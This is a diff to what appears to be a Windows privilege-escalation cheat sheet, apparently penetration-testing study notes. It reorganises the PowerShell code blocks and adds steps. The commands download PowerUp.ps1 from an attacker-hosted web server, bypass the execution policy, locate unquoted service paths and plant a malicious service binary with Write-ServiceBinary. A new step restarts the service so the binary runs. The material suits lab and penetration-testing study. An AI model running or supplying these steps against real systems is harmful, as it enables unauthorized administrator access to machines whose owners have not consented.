@@ -14,7 +14,11 @@ python3 -m http.server 80
 Load the Powershell module:
 ```powershell
 iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
+```
+```powershell
 powershell -ep bypass
+```
+```powershell
 . .\PowerUp.ps1
 ```
 Identify the vulnerable binary:
@@ -35,16 +39,24 @@ python3 -m http.server 80
 Load the Powershell module:
 ```powershell
 iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
+```
+```powershell
 powershell -ep bypass
+```
+```powershell
 . .\PowerUp.ps1
 ```
 Identify the vulnerable service:
 ```powershell
 Get-UnquotedService
 ```
-With the vulnerable service identified, feed forward the name and path:
+With the vulnerable service identified, feed forward the name and path. Nb. be sure to use the exploit path rather than the actual current location of the binary:
 ```powershell
 Write-ServiceBinary -Name 'VulnerableService' -Path "C:\Program Files\Dumb Apps\Tomfoolery.exe"
+```
+Don't forget to restart the service!
+```powershell
+Restart-Service VulnerableService
 ```
 
 ## Manual PrivEsc
